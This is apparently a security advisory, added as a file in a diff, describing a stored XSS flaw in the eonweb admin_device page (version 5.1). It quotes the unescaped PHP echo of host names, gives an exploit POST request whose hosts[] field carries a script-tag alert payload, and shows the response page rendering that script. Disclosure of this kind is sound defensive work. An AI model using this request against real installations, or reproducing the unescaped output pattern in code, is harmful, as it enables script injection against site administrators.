@@ -1,0 +1,39 @@
+Eonweb_module_admin_device_index The persistent (or stored) XSS vulnerability 
+Powered by Shaojie Jiang from 360 SkyEye Labs
+version: 5.1
+https://github.com/EyesOfNetworkCommunity/eonweb
+
+Vulnerability details
+
+# 0x01
+module/admin_device/index.php Line 222
+
+				<?php
+					# --- Retrieve host array from cacti
+					$result=sqlrequest($database_cacti,"SELECT DISTINCT host.id,hostname,description FROM host ORDER BY hostname ASC");
+					echo "<select class='form-control' name='hosts_cacti[]' size=5 multiple>";
+					while ($line = mysqli_fetch_array($result))
+					{
+						echo "<option value='$line[0]'>$line[1] ($line[2])</option>";
+					}
+					echo "</select>";
+				?>
+
+the $result has not been filtered to cause persistent (or stored) XSS
+
+EXP:
+
+
+URL：                     
+https://192.168.227.169/module/admin_device/index.php
+post data:               
+cacti_hostname=0&snmp_template=5&snmp_community=EyesOfNetwork&snmp_port=161&snmp_version=2&username=&password=&snmp_auth_protocol=MD5&snmp_priv_passphrase=&snmp_priv_protocol=&snmp_context=&Import=Import&hosts[]=1 <script>alert(123)</script>
+
+
+
+the return page has the payload:
+
+<select class='form-control' name='hosts_cacti[]' size=5 multiple>
+<option value='35'>( (()</option><option value='31'>) ())</option><option value='16'>, (,)</op
+tion><option value='39'>- (-)</option><option value='33'>. (.)</option><option value='19'>0 (0)</option><
+option value='2'>1 (1)</option><option value='45'>1 <script>alert(123)</script>
